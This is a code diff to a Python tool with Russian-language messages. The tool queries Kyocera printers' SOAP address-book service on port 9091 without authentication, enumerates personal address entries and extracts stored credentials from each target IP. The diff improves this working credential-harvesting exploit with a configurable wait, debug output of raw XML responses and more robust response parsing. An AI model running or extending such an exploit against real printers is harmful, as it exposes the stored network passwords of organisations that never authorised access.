@@ -86,26 +86,41 @@ def build_request_body(action: str, payload: str) -> str:
     )
 
 
-def request_enumeration(url: str, headers: Dict[str, str]) -> str:
+def _find_by_local(obj: Dict, local: str):
+    """Return value for the first key whose local name (after ':') matches."""
+    for k, v in obj.items():
+        if _local_name(k) == local:
+            return v
+    return None
+
+
+def request_enumeration(url: str, headers: Dict[str, str], debug: bool = False) -> str:
     body = build_request_body(
         "http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration",
         "<ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest>",
     )
     response = requests.post(url, data=body, headers=headers, verify=False)
+    if debug:
+        print(f"[DEBUG] enumeration raw response:\n{response.content.decode('utf-8', errors='replace')}\n")
     parsed = xmltodict.parse(response.content.decode("utf-8"))
-    return (
-        parsed["SOAP-ENV:Envelope"]["SOAP-ENV:Body"][
-            "kmaddrbook:create_personal_address_enumerationResponse"
-        ]["kmaddrbook:enumeration"]
-    )
+    soap_body = (parsed.get("SOAP-ENV:Envelope") or {}).get("SOAP-ENV:Body") or {}
+    enum_response = _find_by_local(soap_body, "create_personal_address_enumerationResponse")
+    if not enum_response:
+        raise ValueError(f"create_personal_address_enumerationResponse не найден в теле ответа. Ключи: {list(soap_body.keys())}")
+    enum_val = _find_by_local(enum_response, "enumeration")
+    if not enum_val:
+        raise ValueError(f"enumeration не найден в ответе. Ключи: {list(enum_response.keys())}")
+    return str(enum_val)
 
 
-def request_address_list(url: str, headers: Dict[str, str], enumeration: str):
+def request_address_list(url: str, headers: Dict[str, str], enumeration: str, debug: bool = False):
     body = build_request_body(
         "http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list",
         f"<ns1:get_personal_address_listRequest><ns1:enumeration>{enumeration}</ns1:enumeration></ns1:get_personal_address_listRequest>",
     )
     response = requests.post(url, data=body, headers=headers, verify=False)
+    if debug:
+        print(f"[DEBUG] address_list raw response:\n{response.content.decode('utf-8', errors='replace')}\n")
     return xmltodict.parse(response.content.decode("utf-8"))
 
 
@@ -228,22 +243,22 @@ def display_entries(entries: Iterable[Dict[str, str]], reporter: Reporter) -> No
         reporter.write()
 
 
-def process_printer(ip: str, reporter: Reporter) -> None:
+def process_printer(ip: str, reporter: Reporter, wait: int = 5, debug: bool = False) -> None:
     url = f"https://{ip}:9091/ws/km-wsdl/setting/address_book"
     headers = {"content-type": "application/soap+xml"}
 
     try:
-        enumeration = request_enumeration(url, headers)
+        enumeration = request_enumeration(url, headers, debug=debug)
     except Exception as exc:  # noqa: BLE001
         reporter.write(f"[!] Не удалось получить объект адресной книги с {ip}: {exc}")
         return
 
-    reporter.write(f"[*] Получен объект адресной книги {enumeration} от {ip}. Ожидание заполнения...")
-    time.sleep(5)
+    reporter.write(f"[*] Получен объект адресной книги {enumeration} от {ip}. Ожидание {wait}с...")
+    time.sleep(wait)
     reporter.write("[*] Запрашиваем адресную книгу...")
 
     try:
-        parsed_response = request_address_list(url, headers, enumeration)
+        parsed_response = request_address_list(url, headers, enumeration, debug=debug)
     except Exception as exc:  # noqa: BLE001
         reporter.write(f"[!] Не удалось получить адресную книгу с {ip}: {exc}")
         return
@@ -252,16 +267,19 @@ def process_printer(ip: str, reporter: Reporter) -> None:
     entries = find_credential_entries(body)
 
     if entries:
-        reporter.write(f"[*] Найдено записей с учетными данными: {len(entries)}")
+        reporter.write(f"[+] Найдено записей с учётными данными: {len(entries)}")
         display_entries(entries, reporter)
     else:
         addresses = parse_personal_addresses(body)
         if addresses:
-            reporter.write("[!] Явные учетные данные не найдены. Распарсенные записи адресной книги:")
+            reporter.write("[+] Записи адресной книги (явных паролей нет):")
             display_address_book(addresses, reporter)
         else:
-            reporter.write("[!] Не найдено ни учетных данных, ни записей адресной книги. Полный ответ:")
-            reporter.write(str(body))
+            reporter.write("[!] Адресная книга пуста или структура ответа не распознана.")
+            reporter.write("[!] Запусти с --debug чтобы увидеть сырой XML-ответ.")
+            if debug:
+                reporter.write(f"[DEBUG] body keys: {list(body.keys())}")
+                reporter.write(f"[DEBUG] body: {body}")
 
 
 
@@ -291,6 +309,21 @@ def main(argv: Sequence[str]) -> None:
         dest="output",
         help="Путь к файлу для сохранения результатов",
     )
+    parser.add_argument(
+        "-w",
+        "--wait",
+        dest="wait",
+        type=int,
+        default=5,
+        help="Секунд ждать между запросами (по умолчанию 5)",
+    )
+    parser.add_argument(
+        "-d",
+        "--debug",
+        dest="debug",
+        action="store_true",
+        help="Выводить сырые XML-ответы от принтера",
+    )
 
     args = parser.parse_args(argv)
 
@@ -310,7 +343,7 @@ def main(argv: Sequence[str]) -> None:
     with Reporter(args.output) as reporter:
         for index, ip in enumerate(unique_ips, start=1):
             reporter.write(f"\n[{index}/{total}] Обработка {ip}")
-            process_printer(ip, reporter)
+            process_printer(ip, reporter, wait=args.wait, debug=args.debug)
 
 
 if __name__ == "__main__":
